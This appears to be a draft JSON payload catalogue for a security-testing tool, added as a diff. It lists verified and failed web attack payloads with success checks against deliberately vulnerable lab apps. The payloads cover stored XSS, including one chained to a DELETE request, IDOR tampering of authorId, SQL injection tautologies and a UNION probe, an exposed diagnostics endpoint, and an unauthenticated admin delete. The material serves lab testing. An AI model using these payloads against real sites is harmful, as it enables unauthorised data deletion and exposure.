@@ -1,0 +1,458 @@
+{
+  "schemaVersion": "0.2-draft",
+  "requestExample": {
+    "operation": "get_attack_info",
+    "vulnType": "idor",
+    "target": {
+      "endpoint": "DELETE /api/posts/:id",
+      "parameter": "authorId"
+    }
+  },
+  "responses": [
+    {
+      "vulnType": "stored_xss",
+      "cwe": "CWE-79",
+      "target": {
+        "application": "vul-web-1",
+        "endpoint": "POST /api/posts"
+      },
+      "payloads": [
+        {
+          "payloadId": "script-tag",
+          "value": "<script>alert(1)</script>",
+          "injectionPoint": {
+            "parameter": "content",
+            "sink": "innerHTML"
+          },
+          "successCheck": {
+            "method": "browser",
+            "signal": [
+              "handlerExecuted"
+            ],
+            "expect": {
+              "observe": "callback",
+              "source": "canaryMarker"
+            }
+          },
+          "verifiedOnVulWeb1": "not_confirmed",
+          "reason": "innerHTML에 삽입된 <script>는 실행되지 않음"
+        },
+        {
+          "payloadId": "img-onerror",
+          "value": "<img src=x onerror=alert(1)>",
+          "injectionPoint": {
+            "parameter": "content",
+            "sink": "innerHTML"
+          },
+          "successCheck": {
+            "method": "browser",
+            "signal": [
+              "handlerExecuted"
+            ],
+            "expect": {
+              "observe": "callback",
+              "source": "canaryMarker"
+            }
+          },
+          "verifiedOnVulWeb1": "confirmed"
+        },
+        {
+          "payloadId": "svg-onload",
+          "value": "<svg onload=alert(1)>",
+          "injectionPoint": {
+            "parameter": "content",
+            "sink": "innerHTML"
+          },
+          "successCheck": {
+            "method": "browser",
+            "signal": [
+              "handlerExecuted"
+            ],
+            "expect": {
+              "observe": "callback",
+              "source": "canaryMarker"
+            }
+          },
+          "verifiedOnVulWeb1": "not_confirmed",
+          "reason": "svg onload은 innerHTML 삽입 시 발화하지 않음"
+        },
+        {
+          "payloadId": "script-tag-on-title",
+          "value": "<script>alert(1)</script>",
+          "injectionPoint": {
+            "parameter": "title",
+            "sink": "textContent"
+          },
+          "successCheck": {
+            "method": "browser",
+            "signal": [
+              "handlerExecuted"
+            ],
+            "expect": {
+              "observe": "callback",
+              "source": "canaryMarker"
+            }
+          },
+          "verifiedOnVulWeb1": "not_confirmed",
+          "reason": "title은 textContent로 렌더되어 문자열로 이스케이프됨"
+        },
+        {
+          "payloadId": "img-onerror-delete-chain",
+          "value": "<img src=x onerror=\"fetch('/api/posts/1?authorId=admin',{method:'DELETE'})\">",
+          "injectionPoint": {
+            "parameter": "content",
+            "sink": "innerHTML"
+          },
+          "chainsWith": "client-controlled-delete (authorId 파라미터 변조)",
+          "successCheck": {
+            "method": "browser+http",
+            "signal": [
+              "handlerExecuted",
+              "requestSent",
+              "resourceRemoved"
+            ],
+            "expect": {
+              "observe": "httpRequest",
+              "request": {
+                "method": "DELETE",
+                "path": "/api/posts/1",
+                "query": {
+                  "authorId": "admin"
+                }
+              },
+              "resourceRemoved": {
+                "check": "GET /api/posts",
+                "postId": 1
+              }
+            }
+          },
+          "verifiedOnVulWeb1": "confirmed"
+        }
+      ]
+    },
+    {
+      "vulnType": "idor",
+      "cwe": "CWE-639",
+      "target": {
+        "application": "vul-web-1",
+        "endpoint": "DELETE /api/posts/:id"
+      },
+      "payloads": [
+        {
+          "payloadId": "author-id-tamper",
+          "value": "authorId=admin",
+          "injectionPoint": {
+            "parameter": "authorId",
+            "location": "query"
+          },
+          "successCheck": {
+            "method": "http",
+            "signal": [
+              "accessGranted",
+              "resourceRemoved"
+            ],
+            "expect": {
+              "observe": "httpResponse",
+              "baseline": {
+                "request": {
+                  "method": "DELETE",
+                  "path": "/api/posts/1",
+                  "query": {
+                    "authorId": "alice"
+                  }
+                },
+                "status": 403
+              },
+              "attack": {
+                "request": {
+                  "method": "DELETE",
+                  "path": "/api/posts/1",
+                  "query": {
+                    "authorId": "admin"
+                  }
+                },
+                "status": 200
+              },
+              "resourceRemoved": {
+                "check": "GET /api/posts",
+                "postId": 1
+              }
+            }
+          },
+          "verifiedOnVulWeb1": "confirmed"
+        }
+      ]
+    },
+    {
+      "vulnType": "sql_injection",
+      "cwe": "CWE-89",
+      "target": {
+        "application": "vul-web2",
+        "endpoint": "GET /api/search"
+      },
+      "payloads": [
+        {
+          "payloadId": "or-string-tautology",
+          "value": "' OR '1'='1",
+          "injectionPoint": {
+            "parameter": "q",
+            "location": "query"
+          },
+          "successCheck": {
+            "method": "http",
+            "signal": [
+              "resultSetExpanded"
+            ],
+            "resultField": "results",
+            "expect": {
+              "observe": "httpResponse",
+              "baseline": {
+                "request": {
+                  "method": "GET",
+                  "path": "/api/search",
+                  "query": {
+                    "q": "zzqnomatchzz"
+                  }
+                },
+                "resultCount": 0
+              },
+              "attack": {
+                "request": {
+                  "method": "GET",
+                  "path": "/api/search",
+                  "query": {
+                    "q": "' OR '1'='1"
+                  }
+                },
+                "resultCountMin": 1
+              }
+            }
+          },
+          "verifiedOnVulWeb1": "not_applicable",
+          "verifiedOn": "vul-web2-daehan"
+        },
+        {
+          "payloadId": "or-comment-tautology",
+          "value": "' OR 1=1--",
+          "injectionPoint": {
+            "parameter": "q",
+            "location": "query"
+          },
+          "successCheck": {
+            "method": "http",
+            "signal": [
+              "resultSetExpanded"
+            ],
+            "resultField": "results",
+            "expect": {
+              "observe": "httpResponse",
+              "baseline": {
+                "request": {
+                  "method": "GET",
+                  "path": "/api/search",
+                  "query": {
+                    "q": "zzqnomatchzz"
+                  }
+                },
+                "resultCount": 0
+              },
+              "attack": {
+                "request": {
+                  "method": "GET",
+                  "path": "/api/search",
+                  "query": {
+                    "q": "' OR 1=1--"
+                  }
+                },
+                "resultCountMin": 1
+              }
+            }
+          },
+          "verifiedOnVulWeb1": "not_applicable",
+          "verifiedOn": "vul-web2-daehan"
+        },
+        {
+          "payloadId": "like-wildcard",
+          "value": "%",
+          "injectionPoint": {
+            "parameter": "q",
+            "location": "query"
+          },
+          "successCheck": {
+            "method": "http",
+            "signal": [
+              "resultSetExpanded"
+            ],
+            "resultField": "results",
+            "expect": {
+              "observe": "httpResponse",
+              "baseline": {
+                "request": {
+                  "method": "GET",
+                  "path": "/api/search",
+                  "query": {
+                    "q": "zzqnomatchzz"
+                  }
+                },
+                "resultCount": 0
+              },
+              "attack": {
+                "request": {
+                  "method": "GET",
+                  "path": "/api/search",
+                  "query": {
+                    "q": "%"
+                  }
+                },
+                "resultCountMin": 1
+              }
+            }
+          },
+          "verifiedOnVulWeb1": "not_applicable",
+          "verifiedOn": "vul-web2-daehan"
+        },
+        {
+          "payloadId": "union-null-probe",
+          "value": "' UNION SELECT NULL,NULL,NULL,NULL--",
+          "injectionPoint": {
+            "parameter": "q",
+            "location": "query"
+          },
+          "successCheck": {
+            "method": "http",
+            "signal": [
+              "resultSetExpanded"
+            ],
+            "resultField": "results",
+            "expect": {
+              "observe": "httpResponse",
+              "baseline": {
+                "request": {
+                  "method": "GET",
+                  "path": "/api/search",
+                  "query": {
+                    "q": "zzqnomatchzz"
+                  }
+                },
+                "resultCount": 0
+              },
+              "attack": {
+                "request": {
+                  "method": "GET",
+                  "path": "/api/search",
+                  "query": {
+                    "q": "' UNION SELECT NULL,NULL,NULL,NULL--"
+                  }
+                },
+                "resultCountMin": 1
+              }
+            }
+          },
+          "verifiedOnVulWeb1": "not_applicable",
+          "verifiedOn": "vul-web2-daehan"
+        }
+      ]
+    },
+    {
+      "vulnType": "info_disclosure",
+      "cwe": "CWE-200",
+      "target": {
+        "application": "vul-web2",
+        "endpoint": "GET /_diag/config"
+      },
+      "payloads": [
+        {
+          "payloadId": "diag-config-exposure",
+          "value": "/_diag/config",
+          "injectionPoint": {
+            "parameter": "path",
+            "location": "path"
+          },
+          "successCheck": {
+            "method": "http",
+            "signal": [
+              "sensitiveFieldsReturned"
+            ],
+            "expect": {
+              "observe": "httpResponse",
+              "baseline": {
+                "request": {
+                  "method": "GET",
+                  "path": "/api/search",
+                  "query": {
+                    "q": "zzqnomatchzz"
+                  }
+                },
+                "resultCount": 0
+              },
+              "attack": {
+                "request": {
+                  "method": "GET",
+                  "path": "/_diag/config"
+                },
+                "containsFields": [
+                  "database",
+                  "installedPackages",
+                  "activeSessions"
+                ]
+              }
+            }
+          },
+          "verifiedOnVulWeb1": "not_applicable",
+          "verifiedOn": "vul-web2-daehan"
+        }
+      ]
+    },
+    {
+      "vulnType": "broken_access_control",
+      "cwe": "CWE-862",
+      "target": {
+        "application": "vul-web2",
+        "endpoint": "POST /admin/posts/:id/delete"
+      },
+      "payloads": [
+        {
+          "payloadId": "unauth-delete-featured",
+          "value": "no-session",
+          "injectionPoint": {
+            "parameter": "session",
+            "location": "cookie"
+          },
+          "successCheck": {
+            "method": "http",
+            "signal": [
+              "accessGranted",
+              "availabilityImpact"
+            ],
+            "expect": {
+              "observe": "httpResponse",
+              "baseline": {
+                "request": {
+                  "method": "GET",
+                  "path": "/"
+                },
+                "status": 200
+              },
+              "attack": {
+                "request": {
+                  "method": "POST",
+                  "path": "/admin/posts/1/delete"
+                },
+                "status": 302
+              },
+              "verify": {
+                "request": {
+                  "method": "GET",
+                  "path": "/"
+                },
+                "status": 500
+              }
+            }
+          },
+          "verifiedOnVulWeb1": "not_applicable",
+          "verifiedOn": "vul-web2-daehan"
+        }
+      ]
+    }
+  ]
+}
